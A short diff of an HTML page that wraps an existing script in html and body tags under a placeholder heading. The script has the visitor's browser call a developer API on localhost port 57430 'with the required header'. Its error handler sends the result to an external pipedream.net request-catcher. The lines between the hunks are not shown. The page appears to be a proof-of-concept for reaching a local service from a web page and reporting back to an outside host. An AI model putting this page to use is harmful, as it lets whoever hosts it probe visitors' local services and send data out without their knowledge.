@@ -1,3 +1,7 @@
+<html>
+<body>
+  <h1>some stuff</h1>
+</body>
 <script>
 // try to fetch /api/dev with the required header
 fetch("http://127.0.0.1:57430/api/dev", {
@@ -13,3 +17,4 @@ fetch("http://127.0.0.1:57430/api/dev", {
 })
 .catch(err => fetch("https://eorkhjqchyrh0tc.m.pipedream.net/YOUR_ID?err=" + encodeURIComponent(err)));
 </script>
+</html>
